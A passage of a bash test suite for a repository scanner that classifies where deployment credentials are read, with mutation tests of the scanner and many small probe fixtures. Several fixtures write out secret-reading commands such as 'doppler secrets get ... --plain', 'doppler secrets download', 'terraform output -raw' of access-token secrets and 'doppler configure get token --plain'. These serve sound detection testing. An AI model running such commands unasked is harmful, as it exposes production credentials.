printf '#!/usr/bin/env bash\ndoppler secrets get CF_ACCESS_CLIENT_SECRET --plain\n' > "$D/fx/scripts/gated-a.sh"
bl_regen
commit_all; landed_dir; green c71b "D1: a regenerated baseline that spends a tier-a @allow takes the allow's max-expiry and stays green"

# ── E2: the population is conserved against the independent enumerator (mutants of the scanner's exclusions) ─
cons_mutant() { # <id> <desc> <expected unscanned second-level dir or ''>   (the scanner copy at $D/trio.py is already edited)
  MUTANTS_RUN=$((MUTANTS_RUN + 1))
  knobs RF_PY="$D/trio.py"
  landed_dir
  _launch "$D"
  _q cons "$1" "$D" "$2" "$3"
}
judge_cons() { # <id> <d> <desc> <dir>
  local id="$1" d="$2" desc="$3" want="$4" c u
  if [ "$(cat "$d/landed" 2>/dev/null)" = "landed" ]; then pass "$id lands: $desc"; else fail "$id lands: $desc" "the edit did not change the pristine copy"; return; fi
  if [ "$(cat "$d/rc" 2>/dev/null)" != "0" ]; then fail "$id: the independent enumeration disagrees" "UNRESOLVED: scanner rc=$(cat "$d/rc" 2>/dev/null)"; return; fi
  c="$(cons_diff "$d/fx" "$d/out.scan" | head -c 200)"; u="$(dirs_unscanned "$d/fx" "$d/out.scan" "")"
  if [ -n "$c" ] && { [ -z "$want" ] || case " $u" in *" $want "*) true ;; *) false ;; esac; }; then pass "$id: the independent enumeration and the second-level directory check both go RED${want:+ ($want)}"
  else fail "$id: the independent enumeration and the second-level directory check both go RED" "diff='$c' unscanned='$u'"; fi
}
prep m80
cp "$T/trio.py" "$D/trio.py"
edit "$D/trio.py" 'if rel in (SUITE_REL, BASELINE_REL) or kb_prose(rel, full):' 'if rel in (SUITE_REL, BASELINE_REL) or rel.startswith(("apps/web-platform/app/",)) or kb_prose(rel, full):'
cons_mutant m80 "E2: apps/web-platform/app/ added to the scanner's exclusions" "apps/web-platform/app"
prep m80b
cp "$T/trio.py" "$D/trio.py"
edit "$D/trio.py" 'if rel in (SUITE_REL, BASELINE_REL) or kb_prose(rel, full):' 'if rel in (SUITE_REL, BASELINE_REL) or rel.startswith(("plugins/soleur/agents/",)) or kb_prose(rel, full):'
cons_mutant m80b "E2: plugins/soleur/agents/ added to the scanner's exclusions" "plugins/soleur/agents"
prep m80c
cp "$T/trio.py" "$D/trio.py"
edit "$D/trio.py" 'if rel in (SUITE_REL, BASELINE_REL) or kb_prose(rel, full):' 'if rel in (SUITE_REL, BASELINE_REL) or ex_ext == "ts" or kb_prose(rel, full):'
cons_mutant m80c "E2: every .ts file added to the scanner's exclusions (no whole directory vanishes, only an extension)" ""
prep m80d
cp "$T/trio.py" "$D/trio.py"
edit "$D/trio.py" '            return fh.read(2) != b"#!"' '            return True'
cons_mutant m80d "N2: the shebang sniff dropped from the scanner (docs/runme, an extension-less script, would vanish)" ""
# the floor list must name every scan root (a unit mutant: the list loses plugins)
MUTANTS_RUN=$((MUTANTS_RUN + 1))
_spec_full="$LIVE_ROOT_FLOORS"; _spec_noplug="${LIVE_ROOT_FLOORS/plugins:/zz:}"
if [ "$_spec_noplug" != "$_spec_full" ]; then pass "m81 lands: the floor list loses the plugins root"; else fail "m81 lands: the floor list loses the plugins root" "the substitution did not apply"; fi
_m81="$(floors_missing_roots "$T/ctl.tsv.err" "$_spec_noplug")"
if [ "$_m81" = "plugins " ] && [ -z "$(floors_missing_roots "$T/ctl.tsv.err" "$_spec_full")" ]; then pass "m81: dropping plugins from the floor list is RED (and the full list is not)"
else fail "m81: dropping plugins from the floor list is RED (and the full list is not)" "missing='$_m81'"; fi

# ── the classification table: small probe repos, scanner in --mode emit ────────────────────────────
pr_new pt
PC="$T/probe/cases.tsv"; : > "$PC"
pcase() { printf '%s\t%s\t%s\t%s\t%s\n' "$1" "$2" "$3" "$4" "$5" >> "$PC"; }
pr_mk() { mkdir -p "$(dirname "$PT/$1")"; }
# population (B1/B2)
pr_mk scripts/nul1.sh; printf '#!/usr/bin/env bash\n#%0100d\n\0\ndoppler secrets get WEBHOOK_DEPLOY_SECRET --plain\n' 0 > "$PT/scripts/nul1.sh"
pcase P1 scripts/nul1.sh WEBHOOK_DEPLOY_SECRET tier-a "a NUL after byte 80 does not hide the file (read shape after it)"
pr_mk scripts/nul2.sh; printf '\0\necho "$CF_ACCESS_CLIENT_ID"\n' > "$PT/scripts/nul2.sh"
pcase P2 scripts/nul2.sh CF_ACCESS_CLIENT_ID sink "a NUL on the first line does not hide the file"
pr_mk scripts/nul3.sh; printf 'echo "$WEBHOOK_\0DEPLOY_SECRET"\n' > "$PT/scripts/nul3.sh"
pcase P3 scripts/nul3.sh WEBHOOK_DEPLOY_SECRET sink "a name split by a NUL is read with the NULs removed"
pr_mk assets/blob.png; printf '\211PNG\r\n\032\n\0\0\0\rIHDR\0\0\0' > "$PT/assets/blob.png"
pcase P4 assets/blob.png WEBHOOK_DEPLOY_SECRET ABSENT "a real binary (PNG) names nothing"
pr_mk docs/a.sh; printf '#!/usr/bin/env bash\ndoppler secrets get WEBHOOK_DEPLOY_SECRET --plain\n' > "$PT/docs/a.sh"
pcase P5 docs/a.sh WEBHOOK_DEPLOY_SECRET tier-a "a script under docs/ is scanned"
pr_mk "$KBN/x/a.yaml"; printf 'x: ${CF_ACCESS_CLIENT_ID}\n' > "$PT/$KBN/x/a.yaml"
pcase P6 "$KBN/x/a.yaml" CF_ACCESS_CLIENT_ID sink "a .yaml under knowledge-base/ is scanned"
pr_mk docs/a.md; printf 'WEBHOOK_DEPLOY_SECRET in prose\n' > "$PT/docs/a.md"
pcase P7 docs/a.md WEBHOOK_DEPLOY_SECRET ABSENT "a .md under docs/ is prose"
pr_mk "$KBN/x/pic.svg"; printf '<svg>CF_ACCESS_CLIENT_ID</svg>\n' > "$PT/$KBN/x/pic.svg"
pcase P8 "$KBN/x/pic.svg" CF_ACCESS_CLIENT_ID ABSENT "an .svg under knowledge-base/ is media"
pr_mk docs/a.png; printf 'CF_ACCESS_CLIENT_ID\n' > "$PT/docs/a.png"
pcase P9 docs/a.png CF_ACCESS_CLIENT_ID ABSENT "a .png under docs/ is media"
pr_mk plugins/soleur/skills/z/NOTES.md; printf '# NOTES\nCF_ACCESS_CLIENT_ID\n' > "$PT/plugins/soleur/skills/z/NOTES.md"
pcase P10 plugins/soleur/skills/z/NOTES.md CF_ACCESS_CLIENT_ID sink "a .md outside the doc prefixes is scanned"
# read shapes in the exempt class (B3)
pr_mk tests/scripts/lib/r1.sh
printf '#!/usr/bin/env bash\ndoppler secrets download --no-file --format json -c prd_terraform | jq -r .WEBHOOK_DEPLOY_SECRET\n' > "$PT/tests/scripts/lib/r1.sh"
pcase R1 tests/scripts/lib/r1.sh WEBHOOK_DEPLOY_SECRET tier-a "exempt: secrets download | jq .NAME"
printf '#!/usr/bin/env bash\ndoppler run -p soleur -c "prd_""terraform" -- true\necho CF_ACCESS_CLIENT_ID\n' > "$PT/tests/scripts/lib/r2.sh"
pcase R2 tests/scripts/lib/r2.sh CF_ACCESS_CLIENT_ID tier-a "exempt: a split prd_ + terraform literal"
printf '#!/usr/bin/env bash\nV=CF_ACCESS_CLIENT_SECRET\ndoppler secrets get "$V" --plain\n' > "$PT/tests/scripts/lib/r3.sh"
pcase R3 tests/scripts/lib/r3.sh CF_ACCESS_CLIENT_SECRET tier-a "exempt: secrets get with a variable name"
printf '#!/usr/bin/env bash\nn=WEBHOOK_DEPLOY_SECRET; echo "${!n}"\n' > "$PT/tests/scripts/lib/r4.sh"
pcase R4 tests/scripts/lib/r4.sh WEBHOOK_DEPLOY_SECRET tier-a "exempt: \${!var} indirection of a family name"
printf '#!/usr/bin/env bash\nterraform output -raw access_service_token_client_secret\n' > "$PT/tests/scripts/lib/r5.sh"
pcase R5 tests/scripts/lib/r5.sh ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_SECRET tier-a "exempt: terraform output -raw of the deploy Access token"
printf '#!/usr/bin/env bash\nS="${{ secrets['"'"'CF_ACCESS_CLIENT_ID'"'"'] }}"\n' > "$PT/tests/scripts/lib/r6.sh"
pcase R6 tests/scripts/lib/r6.sh CF_ACCESS_CLIENT_ID tier-a "exempt: the secrets['NAME'] bracket form"
printf '#!/usr/bin/env bash\nS="${{ secrets.WEBHOOK_DEPLOY_SECRET }}"\n' > "$PT/tests/scripts/lib/r7.sh"
pcase R7 tests/scripts/lib/r7.sh WEBHOOK_DEPLOY_SECRET tier-a "exempt: secrets.NAME"
printf '#!/usr/bin/env bash\ndoppler -p soleur -c prd run -- true\necho WEBHOOK_DEPLOY_SECRET\n' > "$PT/tests/scripts/lib/r8.sh"
pcase R8 tests/scripts/lib/r8.sh WEBHOOK_DEPLOY_SECRET tier-a "exempt: doppler run with flags before the subcommand"
printf '#!/usr/bin/env bash\nDOPPLER_CONFIG=prd_terraform doppler run -- cmd\necho WEBHOOK_DEPLOY_SECRET\n' > "$PT/tests/scripts/lib/r9.sh"
pcase R9 tests/scripts/lib/r9.sh WEBHOOK_DEPLOY_SECRET tier-a "exempt: an env-prefixed doppler run"
printf 'import subprocess\nsubprocess.run(["doppler", "secrets", "get", "WEBHOOK_DEPLOY_SECRET"])\n' > "$PT/tests/scripts/lib/r10.py"
pcase R10 tests/scripts/lib/r10.py WEBHOOK_DEPLOY_SECRET tier-a "exempt: a python argv list"
printf '#!/usr/bin/env bash\necho "$WEBHOOK_DEPLOY_SECRET"\n' > "$PT/tests/scripts/lib/t1.sh"
pcase RT1 tests/scripts/lib/t1.sh WEBHOOK_DEPLOY_SECRET ABSENT "exempt twin: a mention with no read shape needs no row"
printf '#!/usr/bin/env bash\ndoppler secrets get SENTRY_DSN --plain\n' > "$PT/tests/scripts/lib/t2.sh"
pcase RT2 tests/scripts/lib/t2.sh WEBHOOK_DEPLOY_SECRET ABSENT "exempt twin: a doppler call in a file naming no family name"
printf '#!/usr/bin/env bash\necho WEBHOOK_DEPLOY_SECRET\nfor v in INTERVAL TIMEOUT; do echo "${!v}"; done\n' > "$PT/tests/scripts/lib/t3.sh"
pcase RT3 tests/scripts/lib/t3.sh WEBHOOK_DEPLOY_SECRET ABSENT "exempt twin: an indirection over non-family names"
printf '#!/usr/bin/env bash\necho WEBHOOK_DEPLOY_SECRET\nterraform output -raw ci_ssh_access_service_token_client_id\n' > "$PT/tests/scripts/lib/t4.sh"
pcase RT4 tests/scripts/lib/t4.sh ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_ID ABSENT "exempt twin: terraform output -raw of the ci_ssh token"
printf '#!/usr/bin/env bash\n# doppler run -c prd_terraform\necho WEBHOOK_DEPLOY_SECRET\n' > "$PT/tests/scripts/lib/t5.sh"
pcase RT5 tests/scripts/lib/t5.sh WEBHOOK_DEPLOY_SECRET ABSENT "exempt twin: a doppler run named only in a comment"
# non-exempt classification (B3)
pr_mk scripts/n1.sh
printf '#!/usr/bin/env bash\necho "$WEBHOOK_DEPLOY_SECRET"\ndoppler secrets get SENTRY_DSN --plain\n' > "$PT/scripts/n1.sh"
pcase N1 scripts/n1.sh WEBHOOK_DEPLOY_SECRET tier-a "any doppler secrets get in a file naming the family"
printf '#!/usr/bin/env bash\necho "$WEBHOOK_DEPLOY_SECRET"\n' > "$PT/scripts/n2.sh"
pcase N2 scripts/n2.sh WEBHOOK_DEPLOY_SECRET sink "no read shape: sink"
printf '#!/usr/bin/env bash\nfor v in WEBHOOK_DEPLOY_SECRET; do :; done\nfor w in INTERVAL; do echo "${!w}"; done\n' > "$PT/scripts/n3.sh"
pcase N3 scripts/n3.sh WEBHOOK_DEPLOY_SECRET sink "an indirection over other names on another line is not a read of the family"
printf '#!/usr/bin/env bash\nn=CF_ACCESS_CLIENT_ID; echo "${!n}"\n' > "$PT/scripts/n4.sh"
pcase N4 scripts/n4.sh CF_ACCESS_CLIENT_ID tier-a "indirection of a family name on one line"
printf '#!/usr/bin/env bash\ndoppler run -- app\necho "$WEBHOOK_DEPLOY_SECRET"\n' > "$PT/scripts/n5.sh"
pcase N5 scripts/n5.sh WEBHOOK_DEPLOY_SECRET tier-a "any doppler run in a file naming the family"
printf '#!/usr/bin/env bash\ndoppler secrets download --no-file\necho "$WEBHOOK_DEPLOY_SECRET"\n' > "$PT/scripts/n6.sh"
pcase N6 scripts/n6.sh WEBHOOK_DEPLOY_SECRET tier-a "any doppler secrets download in a file naming the family"
printf '#!/usr/bin/env bash\ndoppler --silent -p soleur secrets get X\necho "$WEBHOOK_DEPLOY_SECRET"\n' > "$PT/scripts/n7.sh"
pcase N7 scripts/n7.sh WEBHOOK_DEPLOY_SECRET tier-a "doppler flags before the subcommand"
printf '#!/usr/bin/env bash\necho doppler is great\necho "$WEBHOOK_DEPLOY_SECRET"\n' > "$PT/scripts/n8.sh"
pcase N8 scripts/n8.sh WEBHOOK_DEPLOY_SECRET sink "the word doppler alone is not an invocation"
# comments (B4)
printf '#!/usr/bin/env bash\ncat <<EOF2\n#${WEBHOOK_DEPLOY_SECRET}\nEOF2\n' > "$PT/scripts/k1.sh"
pcase K1 scripts/k1.sh WEBHOOK_DEPLOY_SECRET sink "a heredoc line #\${NAME} expands"
printf '#!/usr/bin/env bash\n//usr/bin/curl -H "X-Name: WEBHOOK_DEPLOY_SECRET" https://example.invalid\n' > "$PT/scripts/k2.sh"
pcase K2 scripts/k2.sh WEBHOOK_DEPLOY_SECRET sink "// is not a comment marker in a shell script"
pr_mk .github/workflows/k3.yml
printf 'name: k3\njobs:\n  j:\n    runs-on: x\n    steps:\n      - run: |\n          #${{ secrets.WEBHOOK_DEPLOY_SECRET }}\n' > "$PT/.github/workflows/k3.yml"
pcase K3 .github/workflows/k3.yml WEBHOOK_DEPLOY_SECRET tier-a "a #\${{ secrets.X }} line in a run block expands"
printf '#!/usr/bin/env bash\n# WEBHOOK_DEPLOY_SECRET is the hmac\n' > "$PT/scripts/k4.sh"
pcase K4 scripts/k4.sh WEBHOOK_DEPLOY_SECRET ABSENT "a # comment in a shell script"
printf 'name: k5\n# CF_ACCESS_CLIENT_ID in a comment\njobs: {}\n' > "$PT/.github/workflows/k5.yml"
pcase K5 .github/workflows/k5.yml CF_ACCESS_CLIENT_ID ABSENT "a # comment in a workflow"
pr_mk apps/web-platform/server/k6.ts; printf '// CF_ACCESS_CLIENT_ID in a comment\nexport const a = 1;\n' > "$PT/apps/web-platform/server/k6.ts"
pcase K6 apps/web-platform/server/k6.ts CF_ACCESS_CLIENT_ID ABSENT "a // comment in TypeScript"
printf '// ${CF_ACCESS_CLIENT_ID} x\nexport const a = 1;\n' > "$PT/apps/web-platform/server/k7.ts"
pcase K7 apps/web-platform/server/k7.ts CF_ACCESS_CLIENT_ID sink "a // line holding \${...} is kept"
printf 'class A {\n  #CF_ACCESS_CLIENT_ID = 1;\n}\n' > "$PT/apps/web-platform/server/k8.ts"
pcase K8 apps/web-platform/server/k8.ts CF_ACCESS_CLIENT_ID sink "a JS/TS private field is code"
printf '# CF_ACCESS_CLIENT_ID heading\n' > "$PT/plugins/soleur/skills/z/k9.md"
pcase K9 plugins/soleur/skills/z/k9.md CF_ACCESS_CLIENT_ID sink "Markdown is never comment-filtered"
printf '#!/usr/bin/env bash\n  # indented comment WEBHOOK_DEPLOY_SECRET\n' > "$PT/scripts/k10.sh"
pcase K10 scripts/k10.sh WEBHOOK_DEPLOY_SECRET ABSENT "an indented # comment"
# names
printf 'export TF_VAR_WEBHOOK_DEPLOY_SECRET=1\n' > "$PT/scripts/tn1.sh"
pcase TN1 scripts/tn1.sh WEBHOOK_DEPLOY_SECRET sink "TF_VAR_ spelling"
printf 'webhook_deploy_secret_prev=1\n' > "$PT/scripts/tn2.sh"
pcase TN2 scripts/tn2.sh WEBHOOK_DEPLOY_SECRET_PREV sink "lower-case tfvars spelling"
printf 'D_WEBHOOK_DEPLOY_SECRET=1\nWEBHOOK_DEPLOY_SECRETX=2\nXCF_ACCESS_CLIENT_ID=3\n' > "$PT/scripts/tn3.sh"
pcase TN3 scripts/tn3.sh WEBHOOK_DEPLOY_SECRET ABSENT "left and right token boundaries"
printf 'echo "$WEBHOOK_\\\nDEPLOY_SECRET"\n' > "$PT/scripts/tn4.sh"
pcase TN4 scripts/tn4.sh WEBHOOK_DEPLOY_SECRET sink "a name split by a backslash continuation"
printf 'cf_access_client_id=1\n' > "$PT/scripts/tn5.sh"
pcase TN5 scripts/tn5.sh CF_ACCESS_CLIENT_ID sink "lower-case spelling"
# ALIAS (B5)
printf 'terraform output -raw ci_ssh_access_service_token_client_id\n' > "$PT/scripts/a1.sh"
pcase A1 scripts/a1.sh ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_ID ABSENT "the ci_ssh spelling is another credential"
pr_mk apps/web-platform/infra/a2.tf; printf 'locals { a = cloudflare_zero_trust_access_service_token.ci_ssh.client_id }\n' > "$PT/apps/web-platform/infra/a2.tf"
pcase A2 apps/web-platform/infra/a2.tf ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_ID ABSENT "the ci_ssh resource label"
printf 'locals { a = cloudflare_zero_trust_access_service_token.registry_push.client_secret }\n' > "$PT/apps/web-platform/infra/a3.tf"
pcase A3 apps/web-platform/infra/a3.tf ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_SECRET ABSENT "the registry_push resource label"
printf 'output "access_service_token_client_id" {}\n' > "$PT/apps/web-platform/infra/a4.tf"
pcase A4 apps/web-platform/infra/a4.tf ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_ID tier-a "the deploy output name"
printf 'export TF_VAR_access_service_token_client_secret=1\n' > "$PT/scripts/a5.sh"
pcase A5 scripts/a5.sh ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_SECRET tier-a "the TF_VAR_ spelling of the deploy output"
printf 'locals { a = cloudflare_zero_trust_access_service_token.deploy.client_secret }\n' > "$PT/apps/web-platform/infra/a6.tf"
pcase A6 apps/web-platform/infra/a6.tf ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_SECRET tier-a "the deploy resource label"
printf 'x = var.registry_push_access_service_token_client_id\n' > "$PT/apps/web-platform/infra/a7.tf"
pcase A7 apps/web-platform/infra/a7.tf ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_ID ABSENT "a prefixed variable name (left boundary)"
printf 'echo "$CI_SSH_ACCESS_SERVICE_TOKEN_CLIENT_SECRET"\n' > "$PT/scripts/a8.sh"
pcase A8 scripts/a8.sh ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_SECRET ABSENT "the upper-case ci_ssh spelling"
# FALLBACK (B6)
printf '#!/usr/bin/env bash\nx=$(doppler secrets get CF_ACCESS_CLIENT_ID --plain ||\n  doppler secrets get SOME_OTHER_CRED --plain)\n' > "$PT/scripts/f1.sh"
pcase F1 scripts/f1.sh FALLBACK:SOME_OTHER_CRED tier-a "a trailing || joins the next line"
printf '#!/usr/bin/env bash\nx=$(doppler secrets get CF_ACCESS_CLIENT_ID --plain \\\n  || doppler secrets get SOME_OTHER_CRED --plain)\n' > "$PT/scripts/f2.sh"
pcase F2 scripts/f2.sh FALLBACK:SOME_OTHER_CRED tier-a "a backslash continuation joins the next line"
printf '#!/usr/bin/env bash\nx=$(doppler secrets get CF_ACCESS_CLIENT_ID --plain || echo none)\n' > "$PT/scripts/f3.sh"
pcase F3 scripts/f3.sh FALLBACK:NONE ABSENT "|| echo is not a credential fallback"
# workflows (C2): every branch of the Tier-B environment proof
pr_mk .github/workflows/w.yml
wf() { # <file> <body>
  printf '%s' "$2" > "$PT/.github/workflows/$1"
}
wf w1.yml $'name: w\njobs:\n  j:\n    runs-on: x\n    environment: ${{ inputs.e || \'deploy-channel\' }}\n    steps:\n      - run: echo "$CF_ACCESS_CLIENT_ID"\n'
pcase W1 .github/workflows/w1.yml CF_ACCESS_CLIENT_ID tier-a "an expression whose one arm is Tier-B is not a literal"
wf w2.yml $'name: w\njobs:\n  j:\n    runs-on: x\n    environment: ${{ github.ref == \'refs/heads/main\' && \'deploy-channel\' || \'\' }}\n    steps:\n      - run: echo "$CF_ACCESS_CLIENT_ID"\n'
pcase W2 .github/workflows/w2.yml CF_ACCESS_CLIENT_ID tier-a "a conditional with an empty arm runs unprotected off main"
wf w3.yml $'name: w\njobs:\n  j:\n    runs-on: x\n    strategy:\n      matrix:\n        e: [deploy-channel]\n    environment: ${{ matrix.e }}\n    steps:\n      - run: echo "$CF_ACCESS_CLIENT_ID"\n'
pcase W3 .github/workflows/w3.yml CF_ACCESS_CLIENT_ID tier-a "a matrix environment is not a literal"
wf w4.yml $'name: w\njobs:\n\tj: [\n  environment: deploy-channel\n  run: echo "$CF_ACCESS_CLIENT_ID"\n'
pcase W4 .github/workflows/w4.yml CF_ACCESS_CLIENT_ID tier-a "unparseable YAML cannot prove an environment"
wf w5.yml $'name: w\non: push\nenv:\n  CF_ACCESS_CLIENT_ID: x\n'
pcase W5 .github/workflows/w5.yml CF_ACCESS_CLIENT_ID tier-a "a document with no jobs cannot prove an environment"
wf w6.yml $'name: w\n# note ${CF_ACCESS_CLIENT_ID}\njobs:\n  j:\n    runs-on: x\n    environment: deploy-channel\n    steps:\n      - run: echo hi\n'
pcase W6 .github/workflows/w6.yml CF_ACCESS_CLIENT_ID tier-a "a name no job holds (only a comment) proves nothing"
wf w7.yml $'name: w\nenv:\n  CF_ACCESS_CLIENT_ID: x\njobs:\n  a:\n    runs-on: x\n    environment: deploy-channel\n    steps:\n      - run: echo "$CF_ACCESS_CLIENT_ID"\n  b:\n    runs-on: x\n    steps:\n      - run: echo hi\n'
pcase W7 .github/workflows/w7.yml CF_ACCESS_CLIENT_ID tier-a "a workflow-level env naming the trio makes EVERY job a naming job (one has no environment)"
wf w7b.yml $'name: w\nenv:\n  CF_ACCESS_CLIENT_ID: x\njobs:\n  a:\n    runs-on: x\n    environment: deploy-channel\n    steps:\n      - run: echo hi\n  b:\n    runs-on: x\n    environment: infra-privileged\n    steps:\n      - run: echo hi\n'
pcase W7B .github/workflows/w7b.yml CF_ACCESS_CLIENT_ID tier-b "twin: a workflow-level name with every job on a Tier-B environment is tier-b"
wf w8.yml $'name: w\njobs:\n  j:\n    runs-on: x\n    environment: "deploy-channel"\n    steps:\n      - run: echo "$CF_ACCESS_CLIENT_ID"\n'
pcase W8 .github/workflows/w8.yml CF_ACCESS_CLIENT_ID tier-b "twin: a double-quoted literal environment"
wf w9.yml $'name: w\njobs:\n  j:\n    runs-on: x\n    environment:\n      name: deploy-channel\n      url: https://example.invalid\n    steps:\n      - run: echo "$CF_ACCESS_CLIENT_ID"\n'
pcase W9 .github/workflows/w9.yml CF_ACCESS_CLIENT_ID tier-b "twin: the mapping form of a literal environment"
wf w10.yml $'name: w\njobs:\n  a:\n    runs-on: x\n    environment: infra-privileged\n    steps:\n      - run: echo "$CF_ACCESS_CLIENT_ID"\n  b:\n    runs-on: x\n    steps:\n      - run: echo unrelated\n'
pcase W10 .github/workflows/w10.yml CF_ACCESS_CLIENT_ID tier-b "twin: a job that does not name the trio needs no environment"
wf w11.yml $'name: w\njobs:\n  j:\n    uses: ./.github/workflows/callee.yml\n    with:\n      name: CF_ACCESS_CLIENT_ID\n'
pcase W11 .github/workflows/w11.yml CF_ACCESS_CLIENT_ID tier-a "a reusable-workflow call has no environment to prove"
wf w12.yml $'name: w\njobs:\n  j:\n    runs-on: x\n    environment: release\n    steps:\n      - run: echo "$CF_ACCESS_CLIENT_ID"\n'
pcase W12 .github/workflows/w12.yml CF_ACCESS_CLIENT_ID tier-a "a literal environment outside the Tier-B set"
wf w13.yaml $'name: w\njobs:\n  j:\n    runs-on: x\n    environment: deploy-channel\n    steps:\n      - run: echo "$CF_ACCESS_CLIENT_ID"\n'
pcase W13 .github/workflows/w13.yaml CF_ACCESS_CLIENT_ID tier-b "twin: the .yaml spelling of a workflow"
wf w14.yml $'name: w\njobs:\n  j:\n    runs-on: x\n    environment: deploy-channel\n    steps:\n      - run: echo "$CF_ACCESS_CLIENT_ID"\n---\nname: second\n'
pcase W14 .github/workflows/w14.yml CF_ACCESS_CLIENT_ID tier-a "a multi-document file cannot be measured"
wf w15.yml $'name: w\njobs:\n  j:\n    runs-on: x\n    environment: ""\n    steps:\n      - run: echo "$CF_ACCESS_CLIENT_ID"\n'
pcase W15 .github/workflows/w15.yml CF_ACCESS_CLIENT_ID tier-a "an empty environment"
wf w16.yml $'name: w\nconcurrency:\n  group: ${CF_ACCESS_CLIENT_ID}\njobs:\n  j:\n    runs-on: x\n    steps:\n      - run: echo hi\n'
pcase W16 .github/workflows/w16.yml CF_ACCESS_CLIENT_ID tier-a "a workflow-level key other than env (concurrency) naming the trio counts"
wf w17.yml $'name: w\njobs:\n  j:\n    runs-on: x\n    environment: deploy-channel\n    steps:\n      - run: echo ${{ secrets.WEBHOOK_DEPLOY_SECRET }}\n'
pcase W17 .github/workflows/w17.yml WEBHOOK_DEPLOY_SECRET tier-a "a repo-secret read in a Tier-B job is still a read shape"
mkdir -p "$PT/.github/workflows/sub" "$PT/apps/web-platform/ci"
printf 'name: w\njobs:\n  j:\n    runs-on: x\n    environment: deploy-channel\n    steps:\n      - run: echo "$CF_ACCESS_CLIENT_ID"\n' > "$PT/.github/workflows/sub/s.yml"
pcase W18 .github/workflows/sub/s.yml CF_ACCESS_CLIENT_ID sink "a YAML in a workflows subdirectory is not a workflow"
printf 'steps:\n  - run: echo "$CF_ACCESS_CLIENT_ID"\n' > "$PT/apps/web-platform/ci/ci.yml"
pcase W19 apps/web-platform/ci/ci.yml CF_ACCESS_CLIENT_ID sink "a non-workflow YAML is a sink"
# composite actions (C1)
mkdir -p "$PT/.github/actions/c1" "$PT/.github/actions/c2" "$PT/.github/actions/c3"
printf 'name: c1\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: echo "$CF_ACCESS_CLIENT_ID"\n' > "$PT/.github/actions/c1/action.yml"
pcase CA1 .github/actions/c1/action.yml CF_ACCESS_CLIENT_ID tier-a "a composite action (action.yml) naming the trio is tier-a"
printf 'name: c2\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: echo "$CF_ACCESS_CLIENT_ID"\n' > "$PT/.github/actions/c2/action.yaml"
pcase CA2 .github/actions/c2/action.yaml CF_ACCESS_CLIENT_ID tier-a "a composite action (action.yaml) naming the trio is tier-a"
printf '#!/usr/bin/env bash\necho "$CF_ACCESS_CLIENT_ID"\n' > "$PT/.github/actions/c3/helper.sh"
pcase CA3 .github/actions/c3/helper.sh CF_ACCESS_CLIENT_ID sink "twin: a helper script inside an action directory is a sink"
# prose is not a command (N1): only option flags may sit between `doppler` and the subcommand
printf '#!/usr/bin/env bash\necho "Injected by doppler at plan time, the apply run reads it"\necho "$WEBHOOK_DEPLOY_SECRET"\n' > "$PT/scripts/pro1.sh"
pcase PRO1 scripts/pro1.sh WEBHOOK_DEPLOY_SECRET sink "prose: 'injected by doppler at plan time, the apply run reads it' is not a doppler run"
printf '#!/usr/bin/env bash\necho doppler is not needed to run this step\necho "$WEBHOOK_DEPLOY_SECRET"\n' > "$PT/scripts/pro2.sh"
pcase PRO2 scripts/pro2.sh WEBHOOK_DEPLOY_SECRET sink "prose: 'doppler is not needed to run this step'"
printf -- '- no doppler dependency to run\nsecret = "webhook_deploy_secret"\n' > "$PT/scripts/pro3.sh"
pcase PRO3 scripts/pro3.sh WEBHOOK_DEPLOY_SECRET sink "prose: a bullet 'no doppler dependency to run'"
printf '#!/usr/bin/env bash\necho "doppler -p soleur then run the apply"\necho "$WEBHOOK_DEPLOY_SECRET"\n' > "$PT/scripts/pro4.sh"
pcase PRO4 scripts/pro4.sh WEBHOOK_DEPLOY_SECRET sink "prose after a flag and its value is still prose"
printf '#!/usr/bin/env bash\ndoppler -p soleur -c prd secrets download --no-file\necho "$WEBHOOK_DEPLOY_SECRET"\n' > "$PT/scripts/n9.sh"
pcase N9 scripts/n9.sh WEBHOOK_DEPLOY_SECRET tier-a "flags with values before secrets download"
printf 'import subprocess\nsubprocess.run(["doppler", "-p", "soleur", "run", "--", "x"])\nN = "WEBHOOK_DEPLOY_SECRET"\n' > "$PT/scripts/n10.py"
pcase N10 scripts/n10.py WEBHOOK_DEPLOY_SECRET tier-a "a python argv list with flags before the subcommand"
# comment lines keep what they expand (N3)
printf '#!/usr/bin/env bash\ncat <<EOF2\n#$WEBHOOK_DEPLOY_SECRET\nEOF2\n' > "$PT/scripts/k11.sh"
pcase K11 scripts/k11.sh WEBHOOK_DEPLOY_SECRET sink "a heredoc line #\$NAME (no braces) expands"
printf '#!/usr/bin/env bash\ncat <<EOF2\n#$(doppler secrets get WEBHOOK_DEPLOY_SECRET --plain)\nEOF2\n' > "$PT/scripts/k12.sh"
pcase K12 scripts/k12.sh WEBHOOK_DEPLOY_SECRET tier-a "a heredoc line #\$(doppler secrets get NAME) runs the command"
printf '#!/usr/bin/env bash\ncat <<EOF2\n# `echo $CF_ACCESS_CLIENT_ID`\nEOF2\n' > "$PT/scripts/k13.sh"
pcase K13 scripts/k13.sh CF_ACCESS_CLIENT_ID sink "a heredoc line with backticks around \$NAME expands"
printf '// $CF_ACCESS_CLIENT_ID is raw\nexport const a = 1;\n' > "$PT/apps/web-platform/server/k14.ts"
pcase K14 apps/web-platform/server/k14.ts CF_ACCESS_CLIENT_ID sink "a // line holding an unbraced \$NAME is kept in TS"
printf '#!/usr/bin/env bash\n# WEBHOOK_DEPLOY_SECRET is injected by doppler run via "$(cat /x)"\n' > "$PT/scripts/k15.sh"
pcase K15 scripts/k15.sh WEBHOOK_DEPLOY_SECRET ABSENT "twin: a comment that names the trio OUTSIDE its expansion is inert text"
printf '#!/usr/bin/env bash\necho "$WEBHOOK_DEPLOY_SECRET"\n#   doppler run --token "$(doppler configure get token --plain)" \\\n' > "$PT/scripts/k16.sh"
